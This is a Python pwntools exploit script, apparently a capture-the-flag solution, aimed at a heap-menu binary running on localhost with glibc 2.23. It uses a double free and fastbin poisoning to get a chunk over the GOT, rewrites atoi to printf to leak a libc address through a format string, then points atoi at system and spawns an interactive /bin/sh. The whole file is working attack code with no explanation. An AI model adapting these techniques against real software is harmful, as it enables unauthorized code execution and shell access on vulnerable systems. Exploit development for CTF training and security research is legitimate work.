from pwn import *

elf = ELF("chall")
libc = ELF("libc-2.23.so")
host = "localhost"
port = 9002
r = remote(host, port)


def new(index, size, data):
    r.sendlineafter("> ", "1")
    r.sendlineafter(": ", str(index))
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", data)


def edit(index, size, data):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(index))
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", data)


def edit1(size, data):
    r.sendlineafter("> ", "22")
    r.sendlineafter(": ", "1")
    r.sendlineafter(": ", size)
    r.sendafter(": ", data)


def edit2(index, size):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(index))
    r.sendlineafter(": ", str(size))


def delete(index):
    r.sendlineafter("> ", "3")
    r.sendlineafter(": ", str(index))


new(0, 0x60, "A" * 0x10)
new(1, 0x60, "B" * 0x10)

# Double Free
edit2(0, 0)
delete(1)
delete(0)

new(0, 0x60, p64(0x60202d))

# use fastbin 2 times
new(1, 0x60, "C" * 0x10)
edit(1, 0x70, "c")
delete(1)

new(1, 0x60, "D" * 0x10)
edit(1, 0x20, "d")
delete(1)

# GOT overwrite
# printf GOT : LSB is null
# 0x00007ffff7a62800

buf = b"\x7f\x00\x00"
buf += p64(elf.sym['alarm'] + 6)
buf += p64(elf.sym['read'] + 6)
buf += p64(elf.sym['signal'] + 6)
buf += p64(elf.sym['malloc'] + 6)
buf += p64(0x40071e)  # realloc => ret
buf += p64(elf.sym['setvbuf'] + 6)
buf += p64(elf.sym['printf'] + 6)  # atoi => printf
new(1, 0x60, buf)

# libc leak
r.sendlineafter("> ", "1")
r.sendlineafter(": ", "%3$p")

leak = r.recvuntil("[")[:-1]
libc_leak = int(leak, 16)
libc_base = libc_leak - 0xf7260
system = libc_base + libc.sym['system']

log.success("libc_leak --> %s" % hex(libc_leak))
log.success("libc_base --> %s" % hex(libc_base))
log.success("system_addr --> %s" % hex(system))

buf = b"\x7f\x00\x00"
buf += p64(elf.sym['alarm'] + 6)
buf += p64(elf.sym['read'] + 6)
buf += p64(elf.sym['signal'] + 6)
buf += p64(elf.sym['malloc'] + 6)
buf += p64(0x40071e)  # realloc => ret
buf += p64(elf.sym['setvbuf'] + 6)
buf += p64(system)
edit1("%96c", buf)

# run /bin/sh
r.sendlineafter("> ", "/bin/sh\x00")
r.interactive()
